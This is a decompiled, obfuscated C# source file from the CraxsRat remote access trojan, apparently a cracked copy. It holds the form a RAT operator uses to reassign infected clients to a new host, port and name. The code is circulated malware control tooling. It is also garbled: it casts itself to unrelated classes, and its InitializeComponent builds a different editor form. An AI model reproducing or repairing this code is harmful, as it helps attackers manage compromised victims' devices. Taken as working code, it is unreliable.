// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.EditConnections
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class EditConnections : Form
  {
    public long _stream;
    public string xName;
    public long TotalSize;
    public TimeSpan elapsed_time;
    public DateTime start_time;
    public DateTime stop_time;
    public string DownFolder;
    public string Title;
    private IContainer components;

    internal virtual DrakeUITextBox Htext
    {
      get => ((FileManager) this)._Htext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Htext = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar1
    {
      get => ((FileManager) this)._DrakeUIAvatar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcasd);
label_1:
        int num1 = 486346204;
        DrakeUIAvatar drakeUiAvatar1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~~(num1 * 1166444581) * -1862204623 * -1661356181)) % 8U)
          {
            case 0:
              drakeUiAvatar1.Click -= eventHandler;
              num1 = (int) num2 * -1423180732 ^ 657749221;
              continue;
            case 1:
              drakeUiAvatar1 = ((FileManager) this)._DrakeUIAvatar1;
              num1 = (int) num2 * -511791671 ^ 138300169;
              continue;
            case 2:
              drakeUiAvatar1.Click += eventHandler;
              num1 = (int) num2 * 502204537 ^ -1171092820;
              continue;
            case 3:
              drakeUiAvatar1 = ((FileManager) this)._DrakeUIAvatar1;
              int num3 = drakeUiAvatar1 == null ? 2029435103 : (num3 = 685308443);
              num1 = num3 ^ (int) num2 * -155119506;
              continue;
            case 4:
              ((FileManager) this)._DrakeUIAvatar1 = value;
              num1 = 2026328466;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_1;
            case 7:
              int num4 = drakeUiAvatar1 == null ? 565207381 : (num4 = 722840096);
              num1 = num4 ^ (int) num2 * -560625539;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((FileManager) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((FileManager) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual Label Label2
    {
      get => ((FileManager) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Label2 = value;
    }

    internal virtual Label Label1
    {
      get => ((FileManager) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Label1 = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar2
    {
      get => ((FileManager) this)._DrakeUIAvatar2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar2_Click);
label_1:
        int num1 = -1166013402;
        DrakeUIAvatar drakeUiAvatar2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(num1 * 1702745439 + ---1355941445 * 1799435431 * 2065351569)) % 8U)
          {
            case 0:
              drakeUiAvatar2 = ((FileManager) this)._DrakeUIAvatar2;
              num1 = (int) num2 * 417191046 ^ 711598897;
              continue;
            case 1:
              drakeUiAvatar2 = ((FileManager) this)._DrakeUIAvatar2;
              int num3 = drakeUiAvatar2 == null ? -894113896 : (num3 = 1823655527);
              num1 = num3 ^ (int) num2 * 1262638083;
              continue;
            case 2:
              goto label_1;
            case 3:
              drakeUiAvatar2.Click += eventHandler;
              num1 = (int) num2 * -442156955 ^ -879936547;
              continue;
            case 4:
              int num4 = drakeUiAvatar2 == null ? 1650534390 : (num4 = 1078517732);
              num1 = num4 ^ (int) num2 * 27403575;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((FileManager) this)._DrakeUIAvatar2 = value;
              num1 = -2005455995;
              continue;
            case 7:
              drakeUiAvatar2.Click -= eventHandler;
              num1 = (int) num2 * 2136490489 ^ -350971468;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUITextBox Porttext
    {
      get => ((FileManager) this)._Porttext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Porttext = value;
    }

    internal virtual Label Label4
    {
      get => ((FileManager) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Label4 = value;
    }

    internal virtual DrakeUITextBox cliname
    {
      get => ((FileManager) this)._cliname;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._cliname = value;
    }

    internal virtual DataGridView DGVC
    {
      get => ((FileManager) this)._DGVC;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._DGVC = value;
    }

    internal virtual DataGridViewCheckBoxColumn seleccli
    {
      get => ((FileManager) this)._seleccli;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._seleccli = value;
    }

    internal virtual DataGridViewImageColumn cliico
    {
      get => ((FileManager) this)._cliico;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._cliico = value;
    }

    internal virtual DataGridViewTextBoxColumn cliename
    {
      get => ((FileManager) this)._cliename;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._cliename = value;
    }

    internal virtual SplitContainer SplitContainer1
    {
      get => ((FileManager) this)._SplitContainer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((FileManager) this)._SplitContainer1 = value;
      }
    }

    internal virtual Label Label3
    {
      get => ((FileManager) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Label3 = value;
    }

    public void CraxsRatkfvuiorkenfudpajrsnCraxsRatslkasbtxi(List<Client> L)
    {
      // ISSUE: reference to a compiler-generated method
      ((Drooper._Closure\u0024__77\u002D0) this).InitializeComponent();
      ((FileManager) this).listclients = L;
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1447147339;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(---~num1 ^ -1243311813 ^ 1185536016)) % 10U)
        {
          case 0:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0035B796737);
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0035B796737);
            num1 = 1552021400;
            continue;
          case 1:
            this.cliname.Watermark = Codes.Translate(this.cliname.Watermark, EXGuarder.\u0035B1A322E, EXGuarder.\u0031D232308);
            num1 = (int) num2 * -1080117514 ^ 1623023942;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0031D232308);
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0031D232308);
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0031D232308);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0031D232308);
            num1 = (int) num2 * -880272858 ^ 800797723;
            continue;
          case 4:
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0035B796737);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u0035B1A322E, EXGuarder.\u0035B796737);
            this.cliname.Watermark = Codes.Translate(this.cliname.Watermark, EXGuarder.\u0035B1A322E, EXGuarder.\u0035B796737);
            num1 = (int) num2 * 2063242951 ^ 77877929;
            continue;
          case 5:
            this.Htext.Watermark = Codes.Translate(this.Htext.Watermark, EXGuarder.\u0035B1A322E, EXGuarder.\u0035B796737);
            num1 = (int) num2 * -1019683174 ^ -370514152;
            continue;
          case 6:
            this.Htext.Watermark = Codes.Translate(this.Htext.Watermark, EXGuarder.\u0035B1A322E, EXGuarder.\u0031D232308);
            num1 = (int) num2 * -786290718 ^ 141421254;
            continue;
          case 7:
            int num3 = Operators.CompareString(language, EXGuarder.\u0034A58655C, false) == 0 ? 1004387372 : (num3 = 1613615812);
            num1 = num3 ^ (int) num2 * -828971472;
            continue;
          case 8:
            int num4 = Operators.CompareString(language, EXGuarder.\u00321365E68, false) != 0 ? -218936076 : (num4 = -1063161889);
            num1 = num4 ^ (int) num2 * -362126141;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:;
    }

    public EditConnections(List<Client> L)
    {
label_1:
      int num1 = -1984914359;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(~-1550682494 - (num2 * -562847195 ^ -1408616247 * (785723516 - 1625975372 + -1279343437) + (-1151313807 - (-554230978 - 860181129)) * 1741989839) * -436634405 * 458698633)) % 8U)
        {
          case 0:
            ((FileManager) this).SelectedList = new List<Client>();
            num1 = (int) num3 * 578573289 ^ -1362116267;
            continue;
          case 1:
            this.Load += new EventHandler(this.EditConnections_Load);
            num1 = (int) num3 * 2116561996 ^ -544567454;
            continue;
          case 2:
            ((FileManager) this).NewName = EXGuarder.\u00304337639;
            ((FileManager) this).listclients = new List<Client>();
            num1 = (int) num3 * 1918076955 ^ 2113705734;
            continue;
          case 3:
            goto label_1;
          case 4:
            ((FileManager) this).NewPort = EXGuarder.\u00304337639;
            num1 = (int) num3 * -284785001 ^ -1114556306;
            continue;
          case 5:
            this.CraxsRatkfvuiorkenfudpajrsnCraxsRatslkasbtxi(L);
            num1 = (int) num3 * 1519105126 ^ 1035286377;
            continue;
          case 6:
            ((FileManager) this).NewHost = EXGuarder.\u00304337639;
            num1 = (int) num3 * 1136037689 ^ -30806590;
            continue;
          case 7:
            goto label_3;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcasd(object sender, EventArgs e)
    {
      if (!(string.IsNullOrEmpty(this.Htext.Text) | string.IsNullOrWhiteSpace(this.Htext.Text)))
        goto label_4;
label_1:
      int num1 = -1297682613;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(~(-705225701 * 1791995647 + (~(2097136057 - -1039427872) + (-309205728 - 817046482) * 1628690199 - (473869613 * 1931015231 + -1315996147 * 1883942434 ^ -383743209)) - num2 ^ (~419027494 + --2141151772 ^ 105346826 + ~-116971262) * -755417065) ^ 572889410) - -1319879804)) % 5U)
        {
          case 0:
            goto label_18;
          case 1:
            CraxsAlert.ShowWarning(EXGuarder.\u00350723344);
            num1 = (int) num3 * 1701199898 ^ 1694054754;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_4;
          default:
            goto label_5;
        }
      }
label_18:
      return;
label_5:
      IEnumerator enumerator;
      if (this.DGVC.Rows.Count > 0)
      {
        try
        {
          enumerator = ((IEnumerable) this.DGVC.Rows).GetEnumerator();
label_13:
          while (enumerator.MoveNext())
          {
            DataGridViewRow current = (DataGridViewRow) enumerator.Current;
            try
            {
              ((FileManager) this).SelectedList.Add((Client) current.Tag);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
label_10:
              int num4 = -1492185187;
              while (true)
              {
                int num5 = num4;
                uint num6;
                switch ((num6 = (uint) (~(~(-705225701 * 1791995647 + (~(2097136057 - -1039427872) + (-309205728 - 817046482) * 1628690199 - (473869613 * 1931015231 + -1315996147 * 1883942434 ^ -383743209)) - num5 ^ (~419027494 + --2141151772 ^ 105346826 + ~-116971262) * -755417065) ^ 572889410) - -1319879804)) % 3U)
                {
                  case 1:
                    ProjectData.ClearProjectError();
                    num4 = (int) num6 * 1848990145 ^ -1065603977;
                    continue;
                  case 2:
                    goto label_10;
                  default:
                    goto label_13;
                }
              }
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_16:
            int num7 = -1167032226;
            while (true)
            {
              int num8 = num7;
              uint num9;
              switch ((num9 = (uint) (~(~(-705225701 * 1791995647 + (~(2097136057 - -1039427872) + (-309205728 - 817046482) * 1628690199 - (473869613 * 1931015231 + -1315996147 * 1883942434 ^ -383743209)) - num8 ^ (~419027494 + --2141151772 ^ 105346826 + ~-116971262) * -755417065) ^ 572889410) - -1319879804)) % 3U)
              {
                case 1:
                  (enumerator as IDisposable).Dispose();
                  num7 = (int) num9 * -958966700 ^ -1297892706;
                  continue;
                case 2:
                  goto label_16;
                default:
                  goto label_20;
              }
            }
          }
label_20:;
        }
      }
      this.DialogResult = DialogResult.OK;
label_22:
      int num10 = 607549149;
      while (true)
      {
        int num11 = num10;
        uint num12;
        switch ((num12 = (uint) (~(~(-705225701 * 1791995647 + (~(2097136057 - -1039427872) + (-309205728 - 817046482) * 1628690199 - (473869613 * 1931015231 + -1315996147 * 1883942434 ^ -383743209)) - num11 ^ (~419027494 + --2141151772 ^ 105346826 + ~-116971262) * -755417065) ^ 572889410) - -1319879804)) % 3U)
        {
          case 0:
            goto label_22;
          case 1:
            this.Close();
            num10 = (int) num12 * 1067519448 ^ 119722177;
            continue;
          case 2:
            goto label_24;
          default:
            goto label_14;
        }
      }
label_24:
      return;
label_14:
      return;
label_4:
      ((FileManager) this).NewHost = this.Htext.Text;
      ((FileManager) this).NewPort = this.Porttext.Text;
      ((FileManager) this).NewName = this.cliname.Text;
      num1 = -713566012;
      goto label_2;
    }

    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
      this.DialogResult = DialogResult.No;
      this.Close();
    }

    private void EditConnections_Load(object sender, EventArgs e)
    {
      this.translateme();
      if (((FileManager) this).listclients.Count <= 0)
        return;
      List<Client>.Enumerator enumerator;
      try
      {
        enumerator = ((FileManager) this).listclients.GetEnumerator();
label_8:
        int num1 = enumerator.MoveNext() ? -697702803 : (num1 = 627811373);
        while (true)
        {
          int num2 = num1;
          uint num3;
          Client current;
          int index;
          switch ((num3 = (uint) (-(~((~-1787588978 ^ 25777085 * 484638583) - num2 + ~(~(1908955674 ^ 892726767) * -1140903497)) * 1364446523) ^ -2118217809)) % 6U)
          {
            case 0:
              num1 = -697702803;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              index = this.DGVC.Rows.Add((object) true, (object) ((Data._Closure\u0024__39\u002D17) current).Wallpaper, (object) ((Data._Closure\u0024__39\u002D12) current).ClientName);
              num1 = (int) num3 * -1451080149 ^ 1545471601;
              continue;
            case 2:
              goto label_4;
            case 3:
              this.DGVC.Rows[index].Tag = (object) current;
              num1 = (int) num3 * 66687713 ^ 2046630301;
              continue;
            case 4:
              current = enumerator.Current;
              num1 = 46529896;
              continue;
            case 5:
              goto label_8;
            default:
              goto label_11;
          }
        }
label_4:
        return;
label_11:;
      }
      finally
      {
        enumerator.Dispose();
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 1233369721;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((1919250578 ^ 1610172403) * -1875944491 - (-993163765 ^ 526527122) * -126143289 - (-num2 ^ 1621280319 * ~~(2131221071 - 1405785461)) - (814820091 - 1201135284 + (1719354687 ^ 447122147)))) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((FileManager) this).components.Dispose();
              num1 = (int) num3 * 770736011 ^ 216082461;
              continue;
            case 2:
              int num4 = ((FileManager) this).components == null ? -943355072 : (num4 = -286206310);
              num1 = num4 ^ (int) num3 * -2024104777;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((FileManager) this).components = (IContainer) new System.ComponentModel.Container();
      ((Editor) this).EditText = new RichTextBox();
label_1:
      int num1 = -869409058;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((~num1 ^ 666863619 * -1062747811 ^ 441452725 * ~689563230 * 569221831) * 1779649753 - (-170360413 - -2055110615))) % 41U)
        {
          case 0:
            ((Editor) this).Panel1.ResumeLayout(false);
            num1 = (int) num2 * 769263927 ^ -1474352226;
            continue;
          case 1:
            ((Editor) this).b_ok = new Button();
            num1 = (int) num2 * 1451067587 ^ -2037581633;
            continue;
          case 2:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 887568091 ^ 865283071;
            continue;
          case 3:
            ((Editor) this).PasteToolStripMenuItem.Name = EXGuarder.\u00377665755;
            num1 = (int) num2 * 1929549371 ^ -1648826665;
            continue;
          case 4:
            ((Editor) this).EditText.WordWrap = false;
            num1 = (int) num2 * -449936490 ^ 49398448;
            continue;
          case 5:
            ((Editor) this).EditText.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 2019529855 ^ 1273597218;
            continue;
          case 6:
            ((Editor) this).Panel1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -1052368943 ^ 988457800;
            continue;
          case 7:
            ((Editor) this).EditText.Dock = DockStyle.Fill;
            num1 = (int) num2 * -1427206164 ^ 1071096041;
            continue;
          case 8:
            ((Editor) this).Panel1.TabIndex = 3;
            ((Editor) this).TOpacity.Interval = 1;
            num1 = (int) num2 * -1521390998 ^ -1367221307;
            continue;
          case 9:
            ((Editor) this).b_ok.ForeColor = Color.Black;
            num1 = (int) num2 * 891361186 ^ -1725964516;
            continue;
          case 10:
            ((Editor) this).EditText.TabIndex = 1;
            ((Editor) this).EditText.Text = EXGuarder.\u003613B563E;
            num1 = (int) num2 * 1767223647 ^ 1534501518;
            continue;
          case 12:
            ((Editor) this).CMenu.ResumeLayout(false);
            num1 = (int) num2 * -990924795 ^ 1316133248;
            continue;
          case 13:
            ((Editor) this).Panel1.Controls.Add((Control) ((Editor) this).b_ok);
            num1 = (int) num2 * -1852130508 ^ -552573118;
            continue;
          case 14:
            ((Editor) this).EditText.Name = EXGuarder.\u00323452F50;
            ((Editor) this).EditText.Size = new Size(414, 213);
            num1 = (int) num2 * -1270381495 ^ 477286539;
            continue;
          case 15:
            ((Editor) this).CopyToolStripMenuItem.Text = EXGuarder.\u0034D69086F;
            num1 = (int) num2 * 1442839500 ^ 1113920639;
            continue;
          case 16:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * -1317841209 ^ -1276851608;
            continue;
          case 17:
            this.ClientSize = new Size(414, 241);
            num1 = (int) num2 * 472688998 ^ 731680685;
            continue;
          case 18:
            this.Opacity = 0.0;
            this.Text = EXGuarder.\u0036D3E4476;
            num1 = (int) num2 * 2104285195 ^ -1263362717;
            continue;
          case 19:
            ((Editor) this).CMenu.SuspendLayout();
            this.SuspendLayout();
            ((Editor) this).EditText.BackColor = Color.Black;
            ((Editor) this).EditText.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * 28357367 ^ -680608863;
            continue;
          case 20:
            ((Editor) this).CMenu = new ContextMenuStrip(((FileManager) this).components);
            ((Editor) this).CutToolStripMenuItem = new ToolStripMenuItem();
            ((Editor) this).CopyToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1705577911 ^ -1622564894;
            continue;
          case 21:
            ((Editor) this).b_ok.Name = EXGuarder.\u003264B3B68;
            num1 = (int) num2 * -1525159086 ^ 1984324510;
            continue;
          case 22:
            goto label_1;
          case 23:
            this.Controls.Add((Control) ((Editor) this).Panel1);
            this.Name = EXGuarder.\u0036D3E4476;
            num1 = (int) num2 * -105527776 ^ 1123328238;
            continue;
          case 24:
            this.Controls.Add((Control) ((Editor) this).EditText);
            num1 = (int) num2 * -1653223693 ^ -1117639873;
            continue;
          case 25:
            ((Editor) this).Panel1.Name = EXGuarder.\u00375115F32;
            num1 = (int) num2 * -2140784562 ^ -1618546273;
            continue;
          case 26:
            ((Editor) this).CMenu.Items.AddRange(new ToolStripItem[3]
            {
              (ToolStripItem) ((Editor) this).CutToolStripMenuItem,
              (ToolStripItem) ((Editor) this).CopyToolStripMenuItem,
              (ToolStripItem) ((Editor) this).PasteToolStripMenuItem
            });
            ((Editor) this).CMenu.Name = EXGuarder.\u00344407360;
            ((Editor) this).CMenu.ShowImageMargin = false;
            ((Editor) this).CMenu.Size = new Size(156, 92);
            ((Editor) this).CutToolStripMenuItem.Name = EXGuarder.\u00359445769;
            ((Editor) this).CutToolStripMenuItem.Size = new Size(155, 22);
            ((Editor) this).CutToolStripMenuItem.Text = EXGuarder.\u00313395176;
            ((Editor) this).CopyToolStripMenuItem.Name = EXGuarder.\u0031B167209;
            ((Editor) this).CopyToolStripMenuItem.Size = new Size(155, 22);
            num1 = (int) num2 * 1223248224 ^ -252502112;
            continue;
          case 27:
            ((Editor) this).PasteToolStripMenuItem.Size = new Size(155, 22);
            ((Editor) this).PasteToolStripMenuItem.Text = EXGuarder.\u0032E6C2A71;
            num1 = (int) num2 * 27130690 ^ -1091096625;
            continue;
          case 28:
            ((Editor) this).b_ok.Location = new Point(343, 3);
            num1 = (int) num2 * -193417010 ^ -1408534723;
            continue;
          case 29:
            ((Editor) this).b_ok.TabIndex = 2;
            ((Editor) this).b_ok.Text = EXGuarder.\u003085D5C3A;
            num1 = (int) num2 * 900588800 ^ -6579701;
            continue;
          case 30:
            ((Editor) this).Panel1.Size = new Size(414, 28);
            num1 = (int) num2 * -1399166319 ^ -1859176281;
            continue;
          case 31:
            ((Editor) this).PasteToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -564261694 ^ -657214723;
            continue;
          case 32:
            ((Editor) this).Panel1.ForeColor = Color.FromArgb(190, 190, 190);
            ((Editor) this).Panel1.Location = new Point(0, 213);
            num1 = (int) num2 * 288690081 ^ -1574359416;
            continue;
          case 33:
            ((Editor) this).EditText.Location = new Point(0, 0);
            num1 = (int) num2 * -407229377 ^ 255126087;
            continue;
          case 34:
            ((Editor) this).b_ok.Size = new Size(67, 23);
            num1 = (int) num2 * -810255104 ^ 1869561014;
            continue;
          case 35:
            ((Editor) this).b_ok.BackColor = Color.FromArgb(190, 190, 190);
            ((Editor) this).b_ok.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -1477700375 ^ 1867723133;
            continue;
          case 36:
            ((Editor) this).TOpacity = new Timer(((FileManager) this).components);
            num1 = (int) num2 * 853488358 ^ 410213870;
            continue;
          case 37:
            ((Editor) this).Panel1 = new Panel();
            num1 = (int) num2 * 155683449 ^ -1852229380;
            continue;
          case 38:
            ((Editor) this).b_ok.UseVisualStyleBackColor = false;
            ((Editor) this).b_ok.Visible = false;
            ((Editor) this).Panel1.BackColor = Color.Black;
            num1 = (int) num2 * 2035955223 ^ -2014851753;
            continue;
          case 39:
            ((Editor) this).b_ok.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            num1 = (int) num2 * -1460563425 ^ 40393599;
            continue;
          case 40:
            ((Editor) this).Panel1.SuspendLayout();
            num1 = (int) num2 * 1519328861 ^ 277197348;
            continue;
          default:
            goto label_42;
        }
      }
label_42:
      this.ResumeLayout(false);
    }
  }
}
